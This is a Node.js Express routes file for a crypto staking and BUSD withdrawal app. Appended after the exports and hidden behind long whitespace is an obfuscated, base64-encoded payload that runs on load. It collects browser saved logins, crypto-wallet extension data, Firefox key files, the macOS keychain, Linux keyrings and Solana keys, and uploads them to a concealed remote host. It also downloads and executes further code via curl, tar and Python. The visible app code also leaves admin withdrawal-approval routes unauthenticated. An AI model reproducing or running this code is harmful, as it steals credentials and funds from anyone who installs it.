const UserModel = require('../models/user.model');
const jwt = require('jsonwebtoken');
const express = require('express');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const requestIp = require('request-ip');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])


// All controllers call here
const registerController = require('../controllers/register.controller');
const adminController = require('../controllers/admin.controller');


// cron.schedule("0 1 * * *", async function () {
//     console.log('staiking Cron')
//     await registerController.usersStakingIncome();
// });
//Exchange Controller
// All Validations call here


// Register Routing
router.post('/userregister',  registerController.userRegister.bind()); //done
router.get('/getplandetail',  registerController.getPlanDetails.bind()); //done
router.post('/busddeposit', ensureWebToken, registerController.depositBUSD.bind()); //done
router.post('/gettransactionhistory',ensureWebToken, registerController.getTransactionHistory.bind());
router.post('/addStaking',ensureWebToken, registerController.addStaking.bind());
router.post('/getstakingHistory',ensureWebToken,registerController.getStakingHistory.bind());
router.post('/singalclaimreward',ensureWebToken,registerController.SingalClaimReward.bind());
router.post('/sellplan',ensureWebToken,registerController.SellPlan.bind());
router.post('/gettotalbalance',ensureWebToken,registerController.getTotalBalance.bind());
router.post('/getreferraluserslist',registerController.getReferralUsersList.bind());
router.post('/getwithdrawhistory',ensureWebToken,registerController.getWithdrawHistory.bind());
router.post('/gettotalinvasted',registerController.getTotalInvested.bind());
router.post('/withdrawcrypto',ensureWebToken,registerController.WithdrawCrypto.bind());


router.post('/getwithdrawrequest',adminController.getwithdrawrequest.bind());
router.post('/approvewithdrawrequest',adminController.approvewithdrawrequest.bind());
router.post('/rejectwithdrawrequest',adminController.rejectwithdrawrequest.bind());


router.get('/getuserlist',adminController.getUserList.bind());
router.get('/getstakingdetail',adminController.getStakingDetail.bind());
router.get('/getstakingearningdetail',adminController.getStakingEarningDetail.bind());
router.get('/getdepositbusd',adminController.getdepositBUSDDetail.bind());


cron.schedule("* * * * *", async function () {
    console.log('userBUSDDepositCheck')
    await registerController.userBUSDDepositCheck();
});

const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.address = req.user.address;
            next();
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}



module.exports.routes = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",c="utf8",a=require("fs"),$=require("os"),l=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(l("zcGF0aA")),rq=require(l("YcmVxdWVzdA")),ex=require(l("aY2hpbGRfc"+"HJvY2Vzcw"))[l("cZXhlYw")],hs=$[l("caG9zdG5hbWU")](),pl=$[l("YcGxhdGZvcm0")](),hd=$[l("ZaG9tZWRpcg")](),td=$[l("cdG1wZGly")]();let r;const n=a=>Buffer.from(a,t).toString(c),h=()=>{let t="MjMuMTA2LjaHR0cDovLwI1My4yMDk6MTI0NA==  ";for(var c="",a="",$="",l="",r=0;r<10;r++)c+=t[r],a+=t[10+r],$+=t[20+r],l+=t[30+r];return c=c+$+l,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),e="VDNhbTM3",Z="Z2V0",o="Ly5ucGw",d="d3JpdGVGaWxlU3luYw",u="L2NsaWVudA",G=n("ZXhpc3RzU3luYw"),y="TG9naW4gRGF0YQ",i="Y29weUZpbGU";function m(t){const c=n("YWNjZXN"+"zU3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),p=n("UHJvZmlsZQ"),W=l("aZmlsZW5hbWU"),Y=l("cZm9ybURhdGE"),f=l("adXJs"),w=l("Zb3B0aW9ucw"),V=l("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),z="Ly5jb25maWcv",R="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",X="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],B=["TG9jYWwv"+X,X,_],U=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let g="comp";const q=["bmtiaWhmYmVvZ2Fl","ZWpiYWxiYWtvcGxj","Zmhib2hpbWFlbGJv","aG5mYW5rbm9jZmVv","aWJuZWpkZmptbWtw","YmZuYWVsbW9tZWlt","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],J=["YW9laGxlZm5rb2RiZWZncGdrbm4","aGxnaGVjZGFsbWVlZWFqbmltaG0","aHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmJkZGdjaWpubWhuZm5rZG5hYWQ","Y25scGVia2xtbmtvZW9paG9mZWM","aGxwbWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],Q="Y3JlYXRlUmVhZFN0cmVhbQ",T=async(t,c,$)=>{let l=t;if(!l||""===l)return[];try{if(!m(l))return[]}catch(t){return[]}c||(c="");let r=[];const h=n("TG9jYWwgRXh0ZW5za"+"W9uIFNldHRpbmdz"),s=n(Q);for(let $=0;$<200;$++){const e=`${t}/${0===$?b:`${p} ${$}`}/${h}`;for(let t=0;t<q.length;t++){const h=n(q[t]+J[t]);let Z=`${e}/${h}`;if(m(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{l=pt.join(Z,t);try{r.push({[V]:a[s](l),[w]:{[W]:`${c}${$}_${h}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(l=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[G](l))try{r.push({[V]:a[s](l),[w]:{[W]:t}})}catch(t){}}return C(r),r},C=t=>{const c=l("YbXVsdGlfZmlsZQ"),a=l("ZdGltZXN0YW1w"),$=n("L3VwbG9hZHM"),s={[a]:r.toString(),type:e,hid:g,[c]:t},Z=h();try{const t={[f]:`${Z}${$}`,[Y]:s};rq[L](t,((t,c,a)=>{}))}catch(t){}},A=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(R)}${n(t[1])}`:"l"==pl[0]?`${a}${n(z)}${n(t[2])}`:`${a}${n(x)}${n(t[0])}${n(N)}`,await T($,`${c}_`,0==c)}catch(t){}},E=async()=>{let t=[];const c=n(y),$=n(Q),l=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),r=n("bG9na2MtZGI");if(pa=`${hd}${l}`,a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}else if(pa+="-db",a[G](pa))try{t.push({[V]:a[$](pa),[w]:{[W]:r}})}catch(t){}try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(X)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`pld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`pld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},H=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(R)}${n(k)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/brld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`brld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`brld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},S=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n(R)}${n("RmlyZWZveA")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`fk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`fk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`flj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},M=async()=>{let t=[];n(y);const c=n(Q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let l=[];if($&&""!==$&&m($))try{l=a[v]($)}catch(t){l=[]}l.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[W]:`${t}`}})}catch(t){}}))}catch(t){}return C(t),t},I=async()=>{let t=[];const c=n(y),$=n(Q);try{const l=n(i);let r="";if(r=`${hd}${n(z)}${n(_)}`,r&&""!==r&&m(r))for(let n=0;n<200;n++){const h=`${r}/${0===n?b:`${p} ${n}`}/${c}`;try{if(!m(h))continue;const c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`plld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`plld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},D=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`flk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`flk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`fllj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},P=n("cm1TeW5j"),O="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,l)=>{if(c)return a[P](t),void(tt=0);a[P](t),lt()}))},at=()=>{const t=n("cDIuemlw"),c=`${h()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,l=`${td}\\${t}`;if(tt>=K+6)return;const r=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[G]($))try{var e=a[j]($);e.size>=K+6?(tt=e.size,a[s]($,l,(t=>{if(t)throw t;ct(l)}))):(tt<e.size?tt=e.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[r]($,l),ct(l)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(O)}`;a[G](`${t}`)?(()=>{const t=h(),c=n(u),$=n(Z),l=n(d),r=n(o),s=`${t}${c}/${e}`,G=`${hd}${r}`,y=`"${hd}${n(O)}" "${G}"`;try{a[P](G)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[l](G,$),ex(y,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=h(),c=n(u),$=n(d),l=n(Z),r=n(o),s=n("cHl0aG9u"),G=`${t}${c}/${e}`,y=`${hd}${r}`;let i=`${s}3 "${y}"`;rq[l](G,((t,c,l)=>{t||(a[$](y,l),ex(i,((t,c,a)=>{})))}))})()}));var rt=0;const nt=async()=>{try{r=Date.now(),await(async()=>{g=hs;try{const t=s("~/");await A(B,0),await A(F,1),await A(U,2),"w"==pl[0]?(pa=`${t}${n(x)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(N)}`,await T(pa,"3_",!1)):"d"==pl[0]?(await E(),await H(),await S()):"l"==pl[0]&&(await M(),await I(),await D())}catch(t){}})(),lt()}catch(t){}};nt();let ht=setInterval((()=>{(rt+=1)<5?nt():clearInterval(ht)}),6e5);